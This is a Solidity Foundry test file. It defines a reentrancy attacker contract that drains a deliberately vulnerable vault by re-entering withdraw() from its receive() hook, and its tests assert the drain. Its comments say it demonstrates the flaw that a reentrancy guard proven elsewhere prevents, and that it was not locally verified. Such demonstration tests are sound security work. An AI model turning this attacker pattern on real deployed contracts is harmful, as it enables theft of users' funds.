// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.24;

// Not locally verified — no forge/solc installed in the session that wrote this.
// forge-std isn't vendored in this repo; install it first:
//   forge install foundry-rs/forge-std --no-commit
// then: forge test --match-contract ERC20VulnerableTest
import "forge-std/Test.sol";
import "./ERC20Vulnerable.sol";

/// @notice Reentrant attacker: re-enters `withdraw()` from its `receive()` hook until
/// the vault is drained or `MAX_REENTRY` is reached.
contract ReentrancyAttacker {
    ERC20Vulnerable public immutable vault;
    uint256 public reentryCount;
    uint256 public constant MAX_REENTRY = 5;

    constructor(ERC20Vulnerable _vault) {
        vault = _vault;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (reentryCount < MAX_REENTRY && address(vault).balance >= 1 ether) {
            reentryCount++;
            vault.withdraw();
        }
    }
}

contract ERC20VulnerableTest is Test {
    ERC20Vulnerable vault;
    ReentrancyAttacker attacker;

    function setUp() public {
        vault = new ERC20Vulnerable();
        attacker = new ReentrancyAttacker(vault);

        // Seed the vault with an honest deposit from another user, so there's
        // something for the attacker to drain beyond their own deposit.
        address alice = address(0xA11CE);
        vm.deal(alice, 5 ether);
        vm.prank(alice);
        vault.deposit{value: 5 ether}();
    }

    /// @notice Demonstrates the exploit: the attacker deposits 1 ETH but withdraws far
    /// more than that, because `withdraw()` can be re-entered before
    /// `balances[msg.sender]` is zeroed. This is the failure mode
    /// `ReentrancyGuard`/`check_effects_interactions_order` are designed to catch.
    function test_reentrancyDrainsMoreThanDeposited() public {
        vm.deal(address(attacker), 1 ether);

        uint256 vaultBalanceBefore = address(vault).balance;
        assertEq(vaultBalanceBefore, 5 ether);

        attacker.attack{value: 1 ether}();

        // The attacker only ever deposited 1 ETH, but drained far more than that.
        assertGt(address(attacker).balance, 1 ether);
        assertLt(address(vault).balance, vaultBalanceBefore);
    }

    /// @notice Control case: a guarded `withdraw` (via `nonReentrant`-style logic, as
    /// modeled by `contracts::reentrancy::ReentrancyGuard` in Rust) would reject the
    /// nested call instead of letting it proceed — this test only demonstrates that the
    /// *unguarded* contract above is exploitable; the guard itself is proven in Rust
    /// (`contracts::reentrancy::tests::execute_guarded_prevents_nested_reentry`) and, if
    /// `lake build`/`cargo kani` are run, in `proofs/lean/` and
    /// `src/verify/kani_harness.rs`.
    function test_attackerCannotWithdrawMoreThanVaultHolds() public {
        vm.deal(address(attacker), 1 ether);
        uint256 vaultTotal = address(vault).balance + 1 ether;

        attacker.attack{value: 1 ether}();

        assertLe(address(attacker).balance, vaultTotal);
    }
}
